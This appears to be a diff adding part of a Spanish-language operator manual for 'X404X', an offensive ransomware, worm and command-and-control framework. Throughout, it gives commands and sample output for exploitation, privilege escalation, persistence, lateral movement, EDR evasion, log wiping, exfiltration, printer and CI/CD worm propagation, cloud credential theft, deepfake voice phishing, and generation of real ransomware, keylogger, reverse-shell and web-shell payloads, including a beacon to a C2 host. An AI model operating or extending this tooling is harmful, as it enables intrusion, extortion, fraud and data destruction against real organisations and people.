+### 4.5 Comandos de Operación
+
+| Comando | Acción |
+|---------|--------|
+| `recon --target <IP>` | Escaneo de reconocimiento |
+| `exploit --target <IP>` | Ejecuta cadena de exploits |
+| `privesc` | Escalada de privilegios |
+| `persist` | Instala persistencia |
+| `lateral --target <IP>` | Movimiento lateral |
+| `exfil --path <ruta>` | Exfiltración de datos |
+| `ransomware --target <dir>` | Ejecuta ransomware |
+| `propagate --vector <nombre>` | Propagación vía vector específico |
+
+### 4.6 Comandos de Infraestructura
+
+| Comando | Acción |
+|---------|--------|
+| `listeners` | Lista listeners C2 activos |
+| `dashboard` | Abre URL del dashboard |
+| `deploy` | Despliegue completo one-click |
+| `webhook --url <URL>` | Configura webhook de notificaciones |
+| `db query <sql>` | Consulta la base de datos SQLite |
+| `db hosts` | Lista hosts comprometidos |
+| `db creds` | Lista credenciales capturadas |
+| `db vulns` | Lista vulnerabilidades encontradas |
+
+### 4.7 Comandos de Laboratorio
+
+| Comando | Acción |
+|---------|--------|
+| `lab up` | Inicia laboratorio Docker |
+| `lab down` | Detiene laboratorio |
+| `lab status` | Estado del laboratorio |
+| `lab test --module <nombre>` | Ejecuta test de evasión |
+
+### 4.8 Flujo de Ataque Completo
+
+```
+x404x > campaign start --name "Operation Nightfall"
+[+] Campaign started: Operation Nightfall
+[+] FSM state: idle → recon
+
+x404x > recon --target 10.0.0.0/24
+[+] Scanning 254 hosts...
+[+] Found: 12 hosts, 47 open ports
+[+] FSM state: recon → exploiting
+
+x404x > exploit --target 10.0.0.10
+[+] CVE-2017-0144: SMB probe sent
+[+] CVE-2021-44228: Log4Shell payload delivered
+[+] Access obtained: 10.0.0.10
+[+] FSM state: exploiting → privesc
+
+x404x > privesc
+[+] BYOVD: Loading WinRing0.sys
+[+] DKOM: SYSTEM token stolen
+[+] FSM state: privesc → persisting
+
+x404x > persist
+[+] WER Hangs hijack installed
+[+] Startup persistence: OK
+[+] Scheduled task: WerSyncHang created
+[+] FSM state: persisting → lateral
+
+x404x > lateral --target 10.0.0.20
+[+] Kerberos: Unconstrained delegation found on DC01
+[+] Coercion: PrinterBug sent to DC01
+[+] TGT captured: Administrator@AD.DOMAIN.LOCAL
+[+] Pass-the-Ticket: Access to 10.0.0.20
+
+x404x > exfil --path /sensitive/data
+[+] MFT Slack: 4KB stored in NTFS slack space
+[+] DNS DoH: Data chunked via Cloudflare
+[+] Exfiltration complete
+
+x404x > killchain
+ RECON [██████████] DONE
+ ACCESS [██████████] DONE
+ EXEC   [██████████] DONE
+ PERSIST[██████████] DONE
+ PRIVESC[██████████] DONE
+ LATERAL[██████████] DONE
+ EXFIL  [██████████] DONE
+```
+
+---
+
+## 5. Gestión de Campañas
+
+### 5.1 Ciclo de Vida
+
+```
+                    ┌──────────┐
+                    │   IDLE   │
+                    └────┬─────┘
+                         │ campaign start
+                    ┌────▼─────┐
+                    │  RECON   │
+                    └────┬─────┘
+                         │ targets found
+                    ┌────▼─────┐
+                    │ EXPLOIT  │
+                    └────┬─────┘
+                         │ access obtained
+                    ┌────▼─────┐
+                    │ PRIVESC  │
+                    └────┬─────┘
+                         │ root/SYSTEM
+                    ┌────▼─────┐
+                    │ PERSIST  │──────────────┐
+                    └────┬─────┘              │
+                         │                   │
+              ┌──────────┼──────────┐        │
+              ▼          ▼          ▼        │
+         LATERAL     EXFIL      EVADE ◄──────┘
+              │          │          │
+              └──────────┼──────────┘
+                         ▼
+                    ┌──────────┐
+                    │  DONE    │
+                    └──────────┘
+```
+
+### 5.2 Comandos de Campaña
+
+```bash
+# Desde la consola interactiva
+x404x > campaign start --name "Operation Name" --targets targets.json
+
+# Desde CLI
+./x404x campaign start --name "Operation Name" --targets targets.json
+
+# Opciones:
+#   --name         Nombre de la campaña
+#   --targets      Archivo JSON con objetivos
+#   --phase        Fase inicial (recon, exploit, etc.)
+#   --stealth      Modo sigiloso (velocidad reducida)
+#   --auto         Modo automático (sin intervención)
+```
+
+### 5.3 Archivo de Objetivos (targets.json)
+
+```json
+{
+  "campaign": "Operation Nightfall",
+  "scope": ["10.0.0.0/24", "192.168.1.0/24"],
+  "exclusions": ["10.0.0.1", "10.0.0.254"],
+  "objectives": {
+    "flags": 3,
+    "domain_admin": true,
+    "data_exfil": true
+  },
+  "rules_of_engagement": {
+    "max_hosts": 50,
+    "allowed_ports": [22, 80, 443, 445, 3389],
+    "exploit_risk": "medium",
+    "auto_privesc": true
+  }
+}
+```
+
+---
+
+## 6. Catálogo de Módulos
+
+### 6.1 FASE 1 — Evasión + Anti-Forense (10 módulos)
+
+#### BYOVD Loader (`evasion/byovd_loader`)
+Carga 5 drivers vulnerables para operaciones a nivel kernel.
+
+```bash
+x404x > use evasion/byovd_loader
+x404x (byovd_loader) > show options
+
+# Parámetros:
+#   DRIVERS     WinRing0,Gdrv,RTCore64,kprocesshacker,cpuz
+#   TARGET_PATH C:\Windows\System32\drivers
+#   ACTION      install / uninstall / list
+
+x404x (byovd_loader) > set DRIVERS WinRing0,Gdrv
+x404x (byovd_loader) > run
+```
+
+**Capacidades:**
+- Read/Write Physical Memory vía IOCTL
+- MSR Read/Write (Model-Specific Registers)
+- Handle elevation (PROCESS_ALL_ACCESS)
+- EDR driver stopping (sc stop)
+
+#### DKOM (`evasion/dkom`)
+Ocultación de procesos vía manipulación directa de kernel.
+
+```bash
+x404x > use evasion/dkom
+x404x (dkom) > set PID 1337
+x404x (dkom) > set ACTION hide
+x404x (dkom) > run
+```
+
+**Acciones disponibles:**
+- `hide` — Oculta proceso de ActiveProcessLinks
+- `steal_token` — Roba token SYSTEM (PID 4)
+- `protect` — Protege proceso (PsProtectedType)
+- `downgrade` — Degrada handles de EDR
+
+#### Anti-Reversing (`evasion/anti_reversing`)
+
+```bash
+x404x > use evasion/anti_reversing
+x404x > run
+# Output:
+#   [✓] Debugger: Not present
+#   [✓] Remote Debugger: Not detected
+#   [✓] Hardware BPs: 0 active
+#   [✓] INT3 scan: 12 hits (legitimate)
+#   [✓] CRC Integrity: OK
+#   [✓] Timing Check: PASS
+#   [!] Sandbox: VirtualBox detected (MAC: 08:00:27)
+```
+
+#### Anti-Forensics (`evasion/anti_forensics_adv`)
+
+```bash
+x404x > use evasion/anti_forensics_adv
+x404x (anti_forensics_adv) > set ACTIONS dod_wipe,mft_corrupt,event_clear
+x404x (anti_forensics_adv) > set TARGET_PATH /var/log/audit/
+x404x (anti_forensics_adv) > run
+```
+
+**Técnicas:**
+- DoD 5220.22-M wipe (3-pass, 7-pass)
+- MFT $BITMAP corruption
+- Crash dump disable (registry)
+- Windows Event Log clearing
+- Prefetch / USN Journal / Shellbag wipe
+- ShimCache clearing
+
+#### WER Persistence (`evasion/wer_persistence`)
+
+```bash
+x404x > use evasion/wer_persistence
+x404x (wer_persistence) > set PAYLOAD_DLL C:\Windows\Temp\payload.dll
+x404x (wer_persistence) > run
+```
+
+**Métodos:**
+- HKLM\...\Windows Error Reporting\Hangs → DLL hijack
+- HKLM\...\SilentProcessExit → monitor lsass.exe
+- %APPDATA%\Startup\OneDrive.exe
+- HKCU\...\Run → OneDrive
+- Scheduled Task: WerSyncHang
+
+#### MFT Slack Storage (`evasion/mft_slack`)
+
+```bash
+x404x > use evasion/mft_slack
+x404x (mft_slack) > set ACTION store
+x404x (mft_slack) > set DATA "agent_fragment_base64..."
+x404x (mft_slack) > run
+```
+
+#### WFP DNS Poisoning (`evasion/wfp_dns_poison`)
+
+```bash
+x404x > use evasion/wfp_dns_poison
+x404x (wfp_dns_poison) > set C2_SERVER 10.0.0.1
+x404x (wfp_dns_poison) > set DOMAINS login.microsoftonline.com,*.defender.microsoft.com
+x404x (wfp_dns_poison) > run
+```
+
+#### Blue Pill Hypervisor (`evasion/blue_pill`)
+
+```bash
+x404x > use evasion/blue_pill
+x404x (blue_pill) > run
+# Output:
+#   [✓] VT-x supported
+#   [✓] VMXON region: 4096 bytes
+#   [✓] VMCS configured (guest+host state)
+#   [✓] PatchGuard bypass active
+#   [✓] CPUID trap: redirecting reads
+```
+
+#### LOLBin Chainer (`evasion/lolbin_chainer`)
+
+```bash
+x404x > use evasion/lolbin_chainer
+x404x (lolbin_chainer) > set PAYLOAD calc.exe
+x404x (lolbin_chainer) > set CHAIN_SIZE 5
+x404x (lolbin_chainer) > run
+# Output (random each time):
+#   mshta.exe → rundll32.exe → certutil.exe → bitsadmin.exe → wmic.exe
+```
+
+**28 LOLBins disponibles:**
+- Windows: mshta, rundll32, regsvr32, certutil, bitsadmin, cscript, wmic, msiexec, csc, InstallUtil, regasm, MSBuild, cdb, dnx, winrm, forfiles, pcalua, SyncAppvPublishingServer, desktopimgdownldr
+- Linux: bash, python3, perl, ruby, awk, curl, wget, ncat, strace
+
+#### Kernel DNS Driver (`evasion/wfp_kernel_dns`)
+
+```bash
+x404x > use evasion/wfp_kernel_dns
+x404x (wfp_kernel_dns) > set C2_IP 10.0.0.1
+x404x (wfp_kernel_dns) > run
+```
+
+### 6.2 FASE 2 — C2 Hardened (6 módulos)
+
+#### SPIFFE mTLS (`c2/spiffe_mtls`)
+
+```bash
+x404x > use c2/spiffe_mtls
+x404x (spiffe_mtls) > set TRUST_DOMAIN x404x.c2
+x404x (spiffe_mtls) > set AGENT_PATH /agent/cell-001
+x404x (spiffe_mtls) > run
+# Output:
+#   SPIFFE ID: spiffe://x404x.c2/agent/cell-001
+#   SVID TTL: 1h
+#   Cert Serial: 0x...
+```
+
+#### Multi-Channel C2 (`c2/multi_channel`)
+
+```bash
+x404x > use c2/multi_channel
+x404x (multi_channel) > run
+# Output:
+#   [✓] gRPC: 127.0.0.1:50051 — HEALTHY
+#   [✓] WebSocket: ws://127.0.0.1:8080/ws — HEALTHY
+#   [✓] DoH: cloudflare-dns.com — HEALTHY
+#   [✗] Twitter: API unavailable
+#   [✗] Blockchain: not configured
+#   Active: gRPC (priority 1)
+```
+
+#### Ed25519 Signing (`c2/ed25519`)
+
+```bash
+x404x > use c2/ed25519
+x404x (ed25519) > run
+# Output:
+#   Public Key: a1b2c3d4...
+#   Key ID: e5f6a7b8
+#   Trusted Keys: 3
+#   Signed Commands: 47
+```
+
+#### Dashboard Ops (`c2/dashboard_ops`)
+
+```bash
+x404x > use c2/dashboard_ops
+x404x (dashboard_ops) > set PORT 9090
+x404x (dashboard_ops) > run
+# → http://localhost:9090
+```
+
+#### Kyber-1024 + X25519 (`c2/kyber_hybrid`)
+
+```bash
+x404x > use c2/kyber_hybrid
+x404x (kyber_hybrid) > run
+# Output:
+#   Algorithm: Kyber-1024 + X25519 Hybrid KEM
+#   Public Key: 1600 bytes
+#   Shared Secret: 64 bytes
+#   Session: AES-256-GCM + HMAC-SHA256
+```
+
+#### Proto Obfuscation (`c2/proto_obfuscate`)
+
+```bash
+x404x > use c2/proto_obfuscate
+x404x (proto_obfuscate) > set PROTO_NAME agent.proto
+x404x (proto_obfuscate) > run
+# Output:
+#   Obfuscated: XOR + AES-CTR + GZIP
+#   Original: 4096 bytes → Obfuscated: 1024 bytes (25%)
+#   Integrity: SHA256 verified
+```
+
+### 6.3 FASE 3 — Propagación Avanzada (12 módulos)
+
+#### Ultrasound QPSK (`hydra/ultrasound`)
+
+```bash
+x404x > use hydra/ultrasound
+x404x (ultrasound) > set PAYLOAD "X404X_WORM_V3"
+x404x (ultrasound) > set CARRIER_FREQ 19000
+x404x (ultrasound) > run
+# Output:
+#   WAV file: /tmp/x404x_ultrasound_12345.wav
+#   Carrier: 19kHz, Symbol Rate: 100 baud
+#   Duration: 2.4s, Size: 211680 bytes
+```
+
+**Parámetros:**
+- `CARRIER_FREQ` — Frecuencia portadora (Hz, default: 19000)
+- `SYMBOL_RATE` — Tasa de símbolos (baud, default: 100)
+- `PAYLOAD` — Datos a transmitir
+- `ACTION` — `transmit` / `receive`
+
+#### Powerline PLC (`hydra/powerline`)
+
+```bash
+x404x > use hydra/powerline
+x404x (powerline) > run
+# Output:
+#   HomePlug devices: 3
+#   UPnP devices: 12
+#   PLC targets: 5
+```
+
+#### USB ADB (`hydra/usb_adb`)
+
+```bash
+x404x > use hydra/usb_adb
+x404x (usb_adb) > set APK_PATH /tmp/payload.apk
+x404x (usb_adb) > run
+# Output:
+#   ADB devices: 2
+#   Installed on: emulator-5554 (OK)
+#   Installed on: R58M45XXXXX (OK)
+```
+
+#### DNS Rebinding (`hydra/dns_rebinding`)
+
+```bash
+x404x > use hydra/dns_rebinding
+x404x (dns_rebinding) > set ATTACK_DOMAIN cdn.x404x-edge.net
+x404x (dns_rebinding) > set C2_SERVER 10.0.0.1
+x404x (dns_rebinding) > run
+```
+
+#### CI/CD Webhooks (`hydra/cicd_webhooks`)
+
+```bash
+x404x > use hydra/cicd_webhooks
+x404x (cicd_webhooks) > run
+# Output:
+#   CI Environments detected: 2 (GITHUB_ACTIONS, JENKINS_HOME)
+#   [✓] GitHub Actions workflow injected
+#   [✓] Jenkins job triggered
+```
+
+#### VLAN Jump (`hydra/vlan_jump`)
+
+```bash
+x404x > use hydra/vlan_jump
+x404x (vlan_jump) > set INTERFACE eth0
+x404x (vlan_jump) > set VLAN_RANGE 1,10,20,50,100
+x404x (vlan_jump) > run
+```
+
+#### QR Worm (`hydra/qr_worm`)
+
+```bash
+x404x > use hydra/qr_worm
+x404x (qr_worm) > set PAYLOAD "https://c2.x404x.online/stage2"
+x404x (qr_worm) > run
+# Output:
+#   QR PNG: /tmp/x404x_qr_0_12345.png
+#   Version: 6, Modules: 25×25
+#   Capacity: 4,296 bits
+```
+
+#### PJL Worm (`hydra/pjl_worm`)
+
+```bash
+x404x > use hydra/pjl_worm
+x404x (pjl_worm) > run
+# Output:
+#   Printers found: 4 (HP, Xerox, Canon, Brother)
+#   [✓] NVRAM read: OK
+#   [✓] Firmware injected: OK
+#   [✓] Ransom note printed: OK
+```
+
+#### Chronos NTP (`propagation/chronos_ntp`)
+
+```bash
+x404x > use propagation/chronos_ntp
+x404x (chronos_ntp) > set ACTION forward
+x404x (chronos_ntp) > set HOURS 4
+x404x (chronos_ntp) > run
+# Output:
+#   Fake NTP server: listening on :123
+#   Time offset: +4h
+#   Scheduled tasks: shifted
+#   w32tm: hijacked
+```
+
+#### Reflective DLL (`propagation/reflective_dll`)
+
+```bash
+x404x > use propagation/reflective_dll
+x404x (reflective_dll) > set DLL_PATH /tmp/payload.dll
+x404x (reflective_dll) > set TARGET_PROCESS RuntimeBroker.exe
+x404x (reflective_dll) > run
+# Output:
+#   Method: NtCreateSection + NtMapViewOfSection
+#   Stager: 100 bytes (NASM)
+#   Target: RuntimeBroker.exe (PID 4520)
+#   Injection: OK
+```
+
+#### Kerberos Delegation (`propagation/kerberos_del`)
+
+```bash
+x404x > use propagation/kerberos_del
+x404x (kerberos_del) > set DOMAIN AD.DOMAIN.LOCAL
+x404x (kerberos_del) > run
+# Output:
+#   Unconstrained Delegation: DC01, SQL01, WEB01
+#   [✓] Coercion: PrinterBug → DC01
+#   [✓] TGT captured: Administrator@AD.DOMAIN.LOCAL
+#   [✓] Silver Ticket: cifs/DC01
+```
+
+#### IMDSv2 Bypass (`propagation/imdsv2_bypass`)
+
+```bash
+x404x > use propagation/imdsv2_bypass
+x404x (imdsv2_bypass) > run
+# Output:
+#   AWS Detected: Yes
+#   IMDSv2 Token: AQAEAA...
+#   IAM Role: arn:aws:iam::123456789:role/EC2Admin
+#   Access Key: AKIA...
+#   Neighbor Instances: 3
+```
+
+### 6.4 FASE 4 — IA + Cross-Platform (9 módulos)
+
+#### Cross-Platform Loader (`loader/cross_platform`)
+
+```bash
+x404x > use loader/cross_platform
+x404x (cross_platform) > set TARGET_OS linux
+x404x (cross_platform) > set PAYLOAD "/bin/sh -c 'curl c2/beacon'"
+x404x (cross_platform) > run
+# Output:
+#   [✓] ELF x86-64: 4096 bytes
+#   [✓] Mach-O x86-64: 4096 bytes
+#   [✓] APK: 8192 bytes
+```
+
+**Targets soportados:** `linux`, `darwin`, `android`
+
+#### JIT Polymorphism (`ai/jit_polymorphism`)
+
+```bash
+x404x > use ai/jit_polymorphism
+x404x (jit_polymorphism) > run
+# Output:
+#   Mutations: NOP-sleds → ConstObfuscate → RegisterReorder → InstructionSub → GarbageCode
+#   Original: 256 bytes → Mutated: 312 bytes
+#   Hash: a1b2c3d4
+#   Runtime Loop: active (30s)
+```
+
+#### AI FSM Orchestrator (`ai/orchestrator`)
+
+```bash
+x404x > use ai/orchestrator
+x404x (orchestrator) > run
+# Output:
+#   Algorithm: Q-Learning
+#   States: 8 (idle→evading)
+#   Episodes: 150
+#   Avg Reward: 0.73
+#   Exploration Rate: 0.12
+#   Top Action (idle): recon (Q=0.89)
+```
+
+#### Federated Learning (`ai/federated_learn`)
+
+```bash
+x404x > use ai/federated_learn
+x404x (federated_learn) > set AGENTS 5
+x404x (federated_learn) > run
+# Output:
+#   FedAvg Round: 1
+#   Global Loss: 0.34
+#   Converged: No
+#   Victim Profile: user-001 (vuln=0.72)
+#   Optimal Phish Time: 10:30
+```
+
+#### Autofactory Fuzzer (`ai/autofactory`)
+
+```bash
+x404x > use ai/autofactory
+x404x (autofactory) > set TARGET_BINARY /usr/bin/target
+x404x (autofactory) > run
+# Output:
+#   AFL++: /usr/local/bin/afl-fuzz (available)
+#   Mutations: 1000 cases, 5s
+#   Crashes: 3
+#   Exploit Candidates: 3
+#   Top: Buffer Overflow in target (CVE-2024-XXXX)
+```
+
+#### Wazero Bridge (`bridge/wazero`)
+
+```bash
+x404x > use bridge/wazero
+x404x (wazero) > set HANDLER handler_scan
+x404x (wazero) > run
+# Output:
+#   WASM compiled: handler_scan.wasm (2048 bytes)
+#   Module loaded: OK
+#   Handler test: {"success": true, "target": "127.0.0.1"}
+```
+
+#### RF Contagion (`rf_contagion/baseband`)
+
+```bash
+x404x > use rf_contagion/baseband
+x404x (rf_contagion) > run
+# Output:
+#   SDR: HackRF One (hackrf://0)
+#   Modems: 2 (Quectel EC25, Sierra MC7455)
+#   GSM Signals: 15 (800-900 MHz)
+#   IMSI captured: 3
+```
+
+#### Deepfake Vishing (`ai/deepfake_vishing`)
+
+```bash
+x404x > use ai/deepfake_vishing
+x404x (deepfake_vishing) > set TARGET_NAME "John Smith"
+x404x (deepfake_vishing) > set COMPANY "Acme Corp"
+x404x (deepfake_vishing) > run
+# Output:
+#   Script: "Hello, this is IT Security Operations..."
+#   TTS Model: tacotron2-DDC
+#   Voice Clone: 2.1s audio
+#   Call placed: +15551234567
+```
+
+---
+
+## 7. Dashboard Operacional
+
+### 7.1 Acceso
+
+```bash
+# Iniciar dashboard
+cd plugins/pulse-c2/src/go
+go build -o x404x-dashboard ./cmd/dashboard
+./x404x-dashboard -port 9090
+
+# Acceder en navegador
+open http://localhost:9090
+```
+
+### 7.2 Secciones del Dashboard
+
+| Sección | Descripción | Endpoint |
+|---------|-------------|----------|
+| **Agents** | Lista de agentes activos (ID, hostname, IP, status) | `/api/agents` |
+| **Map** | Mapa de propagación (nodos + edges) | `/api/map` |
+| **Commands** | Historial de comandos firmados emitidos | `/api/commands` |
+| **Status** | Métricas globales (agentes, propagaciones, uptime) | `/api/status` |
+| **WebSocket** | Actualizaciones en tiempo real | `ws://host:9090/ws` |
+
+### 7.3 API Endpoints
+
+```bash
+# Listar agentes
+curl http://localhost:9090/api/agents
+
+# Mapa de propagación
+curl http://localhost:9090/api/map
+
+# Emitir comando firmado
+curl -X POST http://localhost:9090/api/command \
+  -H "Content-Type: application/json" \
+  -d '{"agent_id": "cell-001", "command": "recon"}'
+
+# Estado del sistema
+curl http://localhost:9090/api/status
+```
+
+### 7.4 WebSocket (Tiempo Real)
+
+```javascript
+// Conectar al WebSocket
+const ws = new WebSocket('ws://localhost:9090/ws');
+
+ws.onmessage = function(event) {
+  const data = JSON.parse(event.data);
+  console.log('Agents:', data.agents);
+  console.log('Propagations:', data.propagations);
+  console.log('Commands:', data.commands_issued);
+};
+```
+
+---
+
+## 8. C2 — Command & Control
+
+### 8.1 Configuración SPIFFE mTLS
+
+```yaml
+# config.yaml
+c2:
+  spiffe:
+    trust_domain: "x404x.c2"
+    svid_ttl: 3600        # 1 hora
+    ca_cert: "/etc/x404x/ca.crt"
+    ca_key: "/etc/x404x/ca.key"
+  mtls:
+    enabled: true
+    min_version: "1.3"
+    client_auth: "require_and_verify"
+```
+
+### 8.2 Canales de Comunicación
+
+| Canal | Prioridad | Puerto/URL | Fallback |
+|-------|-----------|------------|----------|
+| **gRPC** | 1 (primario) | `localhost:50051` | No |
+| **WebSocket** | 2 | `ws://host:8080/ws` | Sí |
+| **DNS-over-HTTPS** | 3 | `cloudflare-dns.com` | Sí |
+| **Twitter API** | 4 | `api.twitter.com` | Sí |
+| **Blockchain** | 5 | `btc-mainnet` | Sí |
+
+### 8.3 Firmado de Comandos (Ed25519)
+
+```bash
+# Generar par de claves
+x404x > c2 keygen
+
+# Firmar comando
+x404x > c2 sign --agent cell-001 --command "recon"
+
+# Verificar firma
+x404x > c2 verify --signature "a1b2c3..." --key "d4e5f6..."
+```
+
+### 8.4 Post-Quantum Key Exchange
+
+```bash
+# Intercambio híbrido Kyber-1024 + X25519
+x404x > c2 keyx --algo kyber-hybrid
+
+# Resultado:
+#   Alice Pub: 1600 bytes (Kyber + X25519)
+#   Ciphertext: 1600 bytes
+#   Shared Secret: 64 bytes
+#   Session: AES-256-GCM + HMAC-SHA256
+```
+
+---
+
+## 9. Suite de Evasión
+
+### 9.1 Flujo de Evasión Recomendado
+
+```
+1. BYOVD Loader     → Cargar driver vulnerable
+2. DKOM              → Ocultar procesos del agente
+3. Anti-Reversing    → Detectar debuggers / sandboxes
+4. WFP DNS Poison    → Redirigir tráfico EDR/AV
+5. Blue Pill HV      → Virtualizar el SO (Ring -1)
+6. LOLBin Chainer    → Ejecutar payload sin binarios sospechosos
+7. Anti-Forensics    → Limpiar logs, wipe forense
+8. MFT Slack         → Ocultar payload en NTFS slack
+```
+
+### 9.2 Verificación de Evasión
+
+```bash
+# Test completo de evasión
+x404x > evasion test --all
+
+# Output:
+#   [✓] BYOVD: WinRing0 loaded
+#   [✓] DKOM: Process hidden
+#   [✓] Anti-Debug: No debugger detected
+#   [✓] WFP DNS: 15 domains redirected
+#   [✓] Blue Pill: VT-x active
+#   [✓] LOLBin: Chain generated
+#   [✓] Anti-Forensics: Logs wiped
+#   [✓] MFT Slack: Fragment stored
+```
+
+---
+
+## 10. Vectores de Propagación
+
+### 10.1 Hydra Vectors (8 vectores)
+
+| Vector | Medio | Alcance | Sigilo |
+|--------|-------|---------|--------|
+| Ultrasound QPSK | Aire (audio >18kHz) | ~5m | Muy alto |
+| Powerline PLC | Red eléctrica | Todo el edificio | Alto |
+| USB ADB | USB/Android | Dispositivos conectados | Medio |
+| DNS Rebinding | Red (DNS) | Internet | Alto |
+| CI/CD Webhooks | Internet (APIs) | Organización | Medio |
+| VLAN Jump | Red (Ethernet) | Segmentos de red | Alto |
+| QR Worm | Visual (cámara) | Línea de vista | Muy alto |
+| PJL Worm | Red (impresoras) | Oficina | Alto |
+
+### 10.2 Propagación en Campaña
+
+```bash
+# Activar todos los vectores
+x404x > propagate --vector all
+
+# Activar vectores específicos
+x404x > propagate --vector ultrasound,powerline,usb_adb
+
+# Propagación sigilosa (velocidad reducida)
+x404x > propagate --stealth --delay 30
+```
+
+---
+
+## 11. Módulos de IA
+
+### 11.1 AI Orchestrator (Q-Learning FSM)
+
+```bash
+# Entrenar el orquestador
+x404x > ai train --episodes 1000
+
+# Predecir próxima acción
+x404x > ai predict --state recon
+# Output: exploit (confidence: 0.85, risk: 0.7)
+
+# Exportar Q-Table
+x404x > ai export --output qtable.json
+```
+
+### 11.2 Federated Learning
+
+```bash
+# Iniciar ronda FedAvg
+x404x > ai fedavg --agents 5 --rounds 10
+
+# Perfilar víctima
+x404x > ai profile --user user-001
+# Output:
+#   Login Times: 8.5, 9.0, 9.5, 13.0, 14.0, 18.0
+#   Typing Speed: 52.5 WPM
+#   Vulnerability: 0.72
+#   Optimal Phish: 10:30 AM
+
+# Exportar modelo
+x404x > ai export-model --output fed_model.json
+```
+
+### 11.3 Autofactory Fuzzer
+
+```bash
+# Fuzzear binario objetivo
+x404x > ai fuzz --target /usr/bin/target --duration 60
+
+# Output:
+#   Mutations: 12,000 cases
+#   Crashes: 7
+#   Unique Crashes: 3
+#   Exploit Candidates: 3
+```
+
+### 11.4 Deepfake Vishing
+
+```bash
+# Clonar voz y llamar
+x404x > ai vishing --audio /tmp/ceo_voice.wav --target +15551234567
+
+# Solo generar guión
+x404x > ai vishing --script-only --target-name "Jane Doe" --company "TechCorp"
+```
+
+---
+
+## 12. Laboratorio EDR
+
+### 12.1 Inicio
+
+```bash
+# Iniciar laboratorio
+docker-compose -f lab/docker-compose.edr.yml up -d
+
+# Contenedores:
+#   x404x_edr_target      Windows Server 2022 (Defender ATP)
+#   x404x_siem            Elasticsearch 8
+#   x404x_kibana          Kibana 8
+#   x404x_sysmon_collector Sysmon + Auditd
+#   x404x_test_runner     Test automation
+
+# Acceso:
+#   RDP: localhost:3389
+#   Kibana: http://localhost:5601
+#   Elasticsearch: http://localhost:9200
+```
+
+### 12.2 Tests de Evasión
+
+```bash
+# El test runner ejecuta automáticamente:
+#   1. Static detection check (Python modules)
+#   2. AMSI bypass verification
+#   3. LOLBin chain generation
+#   4. DNS exfiltration check
+#   5. In-memory payload execution
+
+# Ver logs de tests
+docker logs x404x_test_runner
+```
+
+### 12.3 Detener
+
+```bash
+docker-compose -f lab/docker-compose.edr.yml down
+```
+
+---
+
+## 13. Generación de Payloads
+
+### 13.1 Payload Ransomware
+
+```bash
+# PowerShell (Windows)
+python3 -c "
+from plugins.worm.payloads.specialized_payloads import SpecializedPayloads
+p = SpecializedPayloads('10.0.0.1', 8443)
+
+# Simulación (markers seguros)
+sim_payload = p.generate_ransomware_payload(simulation=True)
+print(sim_payload[:200])
+
+# Real (AES-256-CBC)
+real_payload = p.generate_ransomware_payload(simulation=False)
+print(real_payload[:200])
+"
+```
+
+### 13.2 Payloads Especializados
+
+```bash
+python3 -c "
+from plugins.worm.payloads.specialized_payloads import SpecializedPayloads
+p = SpecializedPayloads('10.0.0.1', 8443)
+
+# Keylogger
+print(p.generate_keylogger_payload()[:200])
+
+# Screenshot
+print(p.generate_screenshot_payload()[:200])
+
+# Reverse Shell
+print(p.generate_reverse_shell_payload('10.0.0.1', 4444)[:200])
+
+# Web Shell
+print(p.generate_web_shell('php')[:200])
+"
+```
+
+### 13.3 Cross-Platform
+
+```bash
+# Generar para múltiples plataformas
+python3 -c "
+import sys
+sys.path.insert(0, 'internal/ransomware/loader')
+# La carga cross-platform genera ELF, Mach-O, y APK
+"
+```
+
+---
+
+## 14. Bridge Python
+
+### 14.1 Handlers Disponibles
+
+| Archivo | Handlers | Descripción |
+|---------|----------|-------------|
+| `ransomware.py` | 9 | Core ransomware (encrypt, scan, exfil) |
+| `ransomware_advanced.py` | 17 | Avanzado (USB, SCADA, Bluetooth, AI) |
+| `ransomware_v26.py` | 13 | v26 (POMDP, AI negotiation, evasion deep) |
+| `ransomware_v27.py` | 10 | v27 (UEFI, hypervisor, phishing) |
+| `ransomware_v28.py` | 23 | v28 (IoT, zombie, keyboard LED) |
+| `ransomware_v29.py` | 24 | v29 (HDD destroy, VRM, USB killer) |
+| `ransomware_v210.py` | 10 | v210 (Apocalipsis, Phantom) |
+| `ransomware_blockz.py` | 14 | Block Z (genetic, deepfake, EDR kill) |
+| `attacks.py` | 9 | Brute force, SQLi, XSS, DoS |
+| `bloodhound.py` | 5 | SharpHound data collection |
+| `cred_dump.py` | 6 | Credential dumping |
+| `phase_1_4.py` | **36** | **NUEVO** — Fase 1-4 handlers |
+
+### 14.2 Invocación Directa
+
+```python
+from bridge.handlers.phase_1_4 import handle_byovd_loader
+
+result = handle_byovd_loader({
+    "drivers": ["WinRing0", "Gdrv"],
+    "target_path": "C:\\Windows\\System32\\drivers"
+})
+print(result["success"])  # True
+```
+
+---
+
+## 15. Solución de Problemas
+
+### 15.1 Problemas Comunes
+
+| Problema | Causa | Solución |
+|----------|-------|----------|
+| `go: module not found` | Go modules no inicializados | `cd internal/ransomware && go mod tidy` |
+| `ModuleNotFoundError: cryptography` | Dependencias Python no instaladas | `pip install -r requirements.txt` |
+| Dashboard no carga | Puerto en uso o firewall | `lsof -i :9090` o cambiar puerto |
+| Bridge Python no responde | Puerto 9100 ocupado | `pkill -f bridge.py && python3 bridge.py &` |
+| ADB devices vacío | ADB no instalado o dispositivos no autorizados | `adb kill-server && adb start-server` |
+| SDR no detectado | Drivers RTL-SDR/HackRF no instalados | `rtl_test -t` para verificar |
+| Docker no arranca | Docker daemon parado | `sudo systemctl start docker` |
+| Permisos denegados (Linux) | Raw sockets requieren root | `sudo setcap cap_net_raw+ep ./binary` |
+
+### 15.2 Logs
+
+```bash
+# Logs del bridge Python
+tail -f /tmp/x404x_bridge.log
+
+# Logs del C2
+tail -f /tmp/x404x_c2.log
+
+# Logs del dashboard
+tail -f /tmp/x404x_dashboard.log
+
+# Logs del worm
+tail -f logs/worm_*.log
+
+# Logs de Docker
+docker logs -f x404x_test_runner
+```
+
+### 15.3 Modo Verbose
+
+```bash
+# Activar debug en todos los componentes
+export X404X_DEBUG=1
+
+# Niveles: 1 (info), 2 (debug), 3 (trace)
+export X404X_LOG_LEVEL=3
+```
+
+---
+
+## 16. Referencia de Archivos
+
+### 16.1 Estructura del Proyecto
+
+```
+X404X/
+├── cmd/                           CLI + agente implant
+│   ├── x404x/                     Shell interactiva
+│   └── implant/                   Agente C2 Go
+├── internal/                      Core engine
+│   ├── ransomware/                37 archivos
+│   │   ├── hydra_vectors/         8 vectores
+│   │   ├── loader/                Cross-platform
+│   │   ├── stager/                Reflective DLL
